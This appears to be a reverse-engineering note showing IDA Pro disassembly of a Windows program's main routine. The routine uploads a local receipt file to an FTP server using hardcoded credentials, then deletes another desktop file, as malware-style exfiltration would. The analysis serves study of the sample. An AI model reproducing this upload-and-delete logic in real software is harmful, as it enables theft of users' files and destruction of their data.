# _main Function

The `_main` function code of the Windows executable being reversed-engineered, as shown in IDA Pro:
    
    .text:00401220 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
    .text:00401220
    .text:00401220 ; Attributes: bp-based frame
    .text:00401220
    .text:00401220 ; int __cdecl main(int argc,const char **argv,const char *envp)
    .text:00401220 proc            _main near              ; CODE XREF: ___tmainCRTStartup+15Ap
    .text:00401220
    .text:00401220 argc            = dword ptr  8
    .text:00401220 argv            = dword ptr  0Ch
    .text:00401220 envp            = dword ptr  10h
    .text:00401220
    .text:00401220                 push    ebp
    .text:00401221                 mov     ebp, esp
    .text:00401223                 push    offset szServerName ; ftp.ucd.ie
    .text:00401228                 push    offset unk_40A000
    .text:0040122D                 call    sub_401000
    .text:00401232                 add     esp, 8
    .text:00401235                 push    offset szUserName ; ahmed@ucd.ie
    .text:0040123A                 push    offset unk_40A100
    .text:0040123F                 call    sub_401000
    .text:00401244                 add     esp, 8
    .text:00401247                 push    offset szPassword ; $ecret123
    .text:0040124C                 push    offset unk_40A200
    .text:00401251                 call    sub_401000
    .text:00401256                 add     esp, 8
    .text:00401259                 push    offset szLocalFile ; C:\Users\Derbhle\Desktop\receiptPetrov_9316.pdf
    .text:0040125E                 push    offset unk_40A308
    .text:00401263                 call    sub_401000
    .text:00401268                 add     esp, 8
    .text:0040126B                 push    offset FileName ; C:\Users\Derbhle\Desktop\receipt_Nikolaus218.rtf
    .text:00401270                 push    offset unk_40A408
    .text:00401275                 call    sub_401000
    .text:0040127A                 add     esp, 8
    .text:0040127D                 push    offset unk_40BDC0 ; C:\Users\Derbhle\Desktop\accounts_Nikolaus_5923.rtf
    .text:00401282                 push    offset unk_40A508
    .text:00401287                 call    sub_401000
    .text:0040128C                 add     esp, 8
    .text:0040128F                 push    offset szRemoteFile ; 2520.exe
    .text:00401294                 push    offset unk_40A608
    .text:00401299                 call    sub_401000
    .text:0040129E                 add     esp, 8
    .text:004012A1                 push    offset szLocalFile ; lpszLocalFile - C:\Users\Derbhle\Desktop\receiptPetrov_9316.pdf
    .text:004012A6                 call    sub_401160 // use ftp to put up file
    .text:004012AB                 add     esp, 4
    .text:004012AE                 push    offset FileName ; lpFileName - C:\Users\Derbhle\Desktop\receipt_Nikolaus218.rtf
    .text:004012B3                 call    [ds:DeleteFileW]
    .text:004012B9                 call    sub_401080
    .text:004012BE                 xor     eax, eax
    .text:004012C0                 pop     ebp
    .text:004012C1                 retn
    .text:004012C1 endp            _main
    .text:004012C1
    .text:004012C1 ; ---------------------------------------------------------------------------